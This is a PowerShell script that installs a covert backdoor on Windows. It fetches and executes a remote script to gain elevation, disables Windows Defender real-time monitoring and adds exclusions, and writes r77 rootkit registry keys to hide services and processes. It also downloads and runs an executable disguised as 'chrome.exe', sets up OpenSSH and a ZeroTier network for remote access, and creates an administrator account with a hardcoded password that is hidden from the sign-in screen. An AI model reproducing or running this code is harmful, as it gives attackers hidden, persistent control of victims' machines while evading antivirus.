# Function to handle errors with an option to stop the script
function Handle-Error {
    param([string]$message, [bool]$exit = $false)
    Write-Host "Error: $message" -ForegroundColor Red
    if ($exit) {
        Read-Host -Prompt "Press Enter to exit"
        exit
    }
}

# Check for administrator privileges and request elevation if needed
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Command to download and execute the script from the URL
    $command = "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ogyeet10/installer9000/main/conf.ps1')"
    
    # Encode the command to bypass issues with special characters in the URL
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))

    # Restart PowerShell as Administrator and execute the encoded command
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -Verb RunAs
    exit # Exits the current, non-administrative script instance
}

# Disable Windows Defender Antivirus
Set-MpPreference -DisableRealtimeMonitoring $true

function Get-AntivirusInfo {
    # Ensure running as Administrator
    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Warning "You need to run this script as an Administrator!"
        exit
    }

    # Query WMI for Antivirus information
    try {
        $antivirusProducts = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName "AntivirusProduct"
        $result = New-Object System.Collections.ArrayList
        $whitelist = @("Windows Defender", "Malwarebytes")  # List of allowed antivirus names

        foreach ($product in $antivirusProducts) {
            $result.Add("$($product.displayName) [$($product.productState)]") | Out-Null
        }

        # Output the results
        Write-Output "Installed Antivirus Products:"
        Write-Output $result

        # Check for non-whitelisted antivirus products
        $nonWhitelisted = $result | Where-Object {
            $isWhitelisted = $false
            foreach ($allowedAV in $whitelist) {
                if ($_ -match $allowedAV) {
                    $isWhitelisted = $true
                    break
                }
            }
            -not $isWhitelisted
        }

        # Exit if non-whitelisted products are found
        if ($nonWhitelisted.Count -gt 0) {
            Write-Output "Non-whitelisted antivirus product detected. Exiting script."
            Write-Output "Failed, Press enter to exit"
            [Console]::ReadLine()  # Wait for user to press Enter
            exit
        } else {
            Write-Output "Only whitelisted antivirus products found. Continuing script."
        }
    } catch {
        Write-Error "Failed to query antivirus information. Error: $_"
        exit
    }
}


# Checks for Allowed AVs and quits if any others are detected.
Get-AntivirusInfo

# Adds `$77SWClient.exe' to the Windows Defender exclusion list

# Define the path to the executable, escaping '$' with '`' to ensure it is treated as a literal character
$exePath = 'C:\Windows\system32\$77Starware\$77SWClient.exe'

# Use the Add-MpPreference cmdlet to add the executable to the exclusion list
Add-MpPreference -ExclusionPath $exePath

$exePath = 'C:\Windows\SysWOW64\$77Starware\$77SWClient.exe'
Add-MpPreference -ExclusionPath $exePath

# Adds `chrome.exe' to the Windows Defender exclusion list

# Define the path to the executable, escaping '$' with '`' to ensure it is treated as a literal character
$exePath = 'C:\Users\Aidan\AppData\Local\Temp\chrome.exe'

# Use the Add-MpPreference cmdlet to add the executable to the exclusion list
Add-MpPreference -ExclusionPath $exePath

# Start a new PowerShell window to install and configure OpenSSH Server asynchronously
$openSSHScriptBlock = {
    # Install OpenSSH Server feature if not already present
    if (-not (Get-WindowsCapability -Online | Where-Object { $_.Name -like "OpenSSH.Server*" -and $_.State -eq "Installed"})) {
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    }
    
    # Start and set the SSHD service to run automatically
    Start-Service sshd
    Set-Service -Name sshd -StartupType 'Automatic'

    # Optional: Configure SSHD Config file here if necessary
}

# Encode the script block to base64 to ensure it's correctly executed in a new window
$bytes = [System.Text.Encoding]::Unicode.GetBytes($openSSHScriptBlock.ToString())
$encodedCommand = [Convert]::ToBase64String($bytes)

# Launch the script block in a new PowerShell window
Start-Process PowerShell.exe -ArgumentList "-NoProfile -EncodedCommand $encodedCommand" -WindowStyle Hidden

# Check if ZeroTier One is already installed by checking for any executable in its folder
$zeroTierFolderPath = "C:\Program Files (x86)\ZeroTier\One"
if (Test-Path -Path $zeroTierFolderPath -Filter "*.exe") {
    Write-Host "Executable file found in ZeroTier One folder, skipping download and installation."
} else {
    # Download and Install ZeroTier One silently if not already installed
    $zeroTierMsiUrl = "https://download.zerotier.com/RELEASES/1.6.5/dist/ZeroTierOne.msi"
    $zeroTierMsiPath = Join-Path $env:TEMP "ZeroTierOne.msi"
    Invoke-WebRequest -Uri $zeroTierMsiUrl -OutFile $zeroTierMsiPath
    Start-Process "msiexec.exe" -ArgumentList "/i `"$zeroTierMsiPath`" /quiet" -Wait
    Remove-Item $zeroTierMsiPath -Force # Cleanup installer
}

# Adds services, processes, and startup applications to the r77 configuration registry keys

# Function to check and create the registry key if it doesn't exist
function Ensure-RegistryKey {
    param([string]$path)
    if (-not (Test-Path -Path $path)) {
        New-Item -Path $path -Force | Out-Null
        Write-Host "Registry path created: $path"
    }
    else {
        Write-Host "Registry path already exists: $path"
    }
}

# Ensure the main configuration key exists
$rootRegPath = 'HKLM:\SOFTWARE\$77config'
Ensure-RegistryKey -path $rootRegPath

# Ensure the service_names subkey exists
$serviceNamesPath = "$rootRegPath\service_names"
Ensure-RegistryKey -path $serviceNamesPath

# Ensure the process_names subkey exists
$processNamesPath = "$rootRegPath\process_names"
Ensure-RegistryKey -path $processNamesPath

# Ensure the startup subkey exists
$startupPath = "$rootRegPath\startup"
Ensure-RegistryKey -path $startupPath

# Function to add a service name to the registry if not already present
function Add-ServiceName {
    param([string]$service)
    if (-not (Get-ItemProperty -Path $serviceNamesPath -Name $service -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $serviceNamesPath -Name $service -Value $service -PropertyType String | Out-Null
        Write-Host "Service name added to registry: $service"
    }
    else {
        Write-Host "Service name already in registry: $service"
    }
}

# Function to add a process name to the registry if not already present
function Add-ProcessName {
    param([string]$process)
    if (-not (Get-ItemProperty -Path $processNamesPath -Name $process -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $processNamesPath -Name $process -Value $process -PropertyType String | Out-Null
        Write-Host "Process name added to registry: $process"
    }
    else {
        Write-Host "Process name already in registry: $process"
    }
}

# Function to add a startup application to the registry if not already present
function Add-StartupApplication {
    param([string]$applicationPath)
    $executableName = [System.IO.Path]::GetFileName($applicationPath)
    if (-not (Get-ItemProperty -Path $startupPath -Name $executableName -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $startupPath -Name $executableName -Value $applicationPath -PropertyType String | Out-Null
        Write-Host "Startup application added to registry: $executableName"
    }
    else {
        Write-Host "Startup application already in registry: $executableName"
    }
}

# Add "ZeroTierOneService" and "sshd" to the service names registry
Add-ServiceName -service 'ZeroTierOneService'
Add-ServiceName -service 'sshd'

# Add "reg.exe" to the process names registry
Add-ProcessName -process 'reg.exe'

# Adds startup applications to $77Config
Add-StartupApplication -applicationPath 'C:\Windows\SysWOW64\$77Starware\$77SWClient.exe'

# Output completion message
Write-Host "Services, processes, and startup applications have been configured in the registry."

# Define the URL and download location for improved.exe
$exeUrl = "https://github.com/Ogyeet10/installer9000/raw/main/chrome.exe"
$tempFolder = $env:TEMP
$exePath = Join-Path $tempFolder "chrome.exe"

# Download improved.exe from the provided URL
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

# Execute improved.exe without waiting for completion. EXE Deletes itself, no need to do it manually.
Start-Process -FilePath $exePath -Verb RunAs -Wait

# Create a new user `ssh-user` with administrative privileges
# Check if SSH user exists before creating
$userName = "ssh-user"
if (-not (Get-LocalUser -Name $userName -ErrorAction SilentlyContinue)) {
    $password = ConvertTo-SecureString "aidan123" -AsPlainText -Force
    New-LocalUser -Name $userName -Password $password -Description "SSH user account" -UserMayNotChangePassword -PasswordNeverExpires
    Add-LocalGroupMember -Group "Administrators" -Member $userName
} else {
    Write-Host "User $userName already exists. No need to create a new user."
}


# Path to the SpecialAccounts\UserList registry key
$specialAccountsPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

# Check if the SpecialAccounts\UserList key exists, if not, create it
if (-not (Test-Path $specialAccountsPath)) {
    New-Item -Path $specialAccountsPath -Force
}

# Add the ssh-user to the UserList to hide it from the sign-in screen
New-ItemProperty -Path $specialAccountsPath -Name "ssh-user" -Value 0 -PropertyType DWORD -Force

# Output the current exclusion list to verify the addition
Get-MpPreference | Select -ExpandProperty ExclusionPath

# Join the specified ZeroTier network
# Ensure the ZeroTier service is running before attempting to join a network
Start-Service -Name "ZeroTierOneService"
$networkId = "af78bf9436d39eb1" # Replace with your network ID
Start-Sleep -Seconds 5 # Give some time for the ZeroTier service to start
& "C:\Program Files (x86)\ZeroTier\One\zerotier-cli.bat" join $networkId

# Re-enable Windows Defender Antivirus
Set-MpPreference -DisableRealtimeMonitoring $false

Remove-Item $zeroTierMsiPath -Force

Write-Host "Setup complete. SSH user created and configured. Joined ZeroTier network: $networkId."
Write-Host "Windows Defender Antivirus has been re-enabled."

Read-Host -Prompt "Press Enter to exit"
